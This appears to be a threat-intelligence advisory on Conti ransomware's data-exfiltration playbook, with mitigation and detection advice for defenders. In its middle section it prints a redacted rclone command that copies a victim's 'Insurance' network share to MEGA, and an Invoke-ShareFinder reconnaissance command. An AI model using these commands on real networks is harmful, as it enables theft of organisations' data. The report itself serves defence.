Conti infiltrates the victim’s network and obtains admin domain access\n\n2. Cobalt Strike beacon session initiated; network mapped and scanned and elevated\n\n3. Initial investigation of critical finance/insurance-related information\n\n4. The \"rclone\" binary with the custom \"Mega\" file-sharing site config are uploaded to the\n\ndomain controller\n\n5. Network shares with information related to finance and insurance cloned to the\n\ndetermined location\n\n6. Data copy is created and can be securely accessed by Conti\n\n7. Conti locks the network and encrypts the files and locks out the network via the\n\n\"serverlock.bat\" script\n\n**What is rclone?**\n\n\n-----\n\nrclone is a program that enables the transfer of content on the cloud and other storage. With\nRclone data can be synchronized with a configuration on an external source such as a cloud\nsource creating an external copy of the information from a specific environment. Conti\nransomware weaponizes this program in order to perform data exfiltration operations.\n\n**Operational Insights: Conti’s Perspective on Data Exfiltration**\n\nThis AdvIntel observed active breath tactics match precisely the disgruntled Conti\nransomware \"pentester\" playbook detailing their process.\n\nIn the investigated case which serves as the factual basis for this report, AdvIntel utilized our\nunique visibility into Conti’s operations in order to identify critical points in their methodology.\n\nAccording to the actors themselves, the first step in network investigation and data\nexfiltration is to identify the critical files within the network - and identify/map the network\nshares with these files.\n\nThe redacted logs show the command \"Invoke_ShareFinder\" execution preceding the\n\"rclone\" operations.\n\n\n-----\n\nConti openly prioritized network shares with documentation related to:\n\nFinance\n\nAccounting\n\nInsurance\n\nInformation Technology\n\nThen the Rclone weaponization begins. Rclone config is created and an external location\n(MEGA in this case) for data synchronization (data cloning) is established. The needed\nnetwork shares are assigned within the rclone.conf on the victim’s network and a command\nis executed.\n\nAn example of a redacted rclone execution is listed below:\n```\nshell rclone.exe copy \"\\\\VICTIM_DOMAIN\\Insurance\" MEGA:<Insurance_Folder> -q -ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M\n\n```\n“Insurance” is the name of the network shares with specific information (as seen Conti\ntargets insurance specifically) that will be copied.\n\nThe AdvIntel proactive visibility into Conti revealed the insurance focus of the group targeting\nmajor food and restaurant chain in the United States.\n\n**_Indicators of Exfiltration: Mitigation_**\n\nAudit and/or block command-line interpreters by using whitelisting tools, like AppLocker or\nSoftware Restriction Policies with the focus on any suspicious “rclone.exe” command in\nC:\\ProgramData and C:\\Temp directory.\n\nLook for detection for \"Invoke-ShareFinder\" execution preceding the execution of rclone:\n```\n\"Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii\"\n\n```\n**_Detection Methods_**\n\n\n-----\n\nCommand-line interface activities can be captured through proper logging of process\nexecution with command-line arguments.\n\n**_Reference_**\n\nTactic: T1059 Command and Scripting Interpreter\n\n_Our proprietary platform, Andariel, provides a mirrored view of criminal and botnet activity,_\n_which supplies our users with predictive insight that is used to prevent intrusions from_\n_maturing into large-scale threat events such as ransomware attacks._\n\n\n-----",
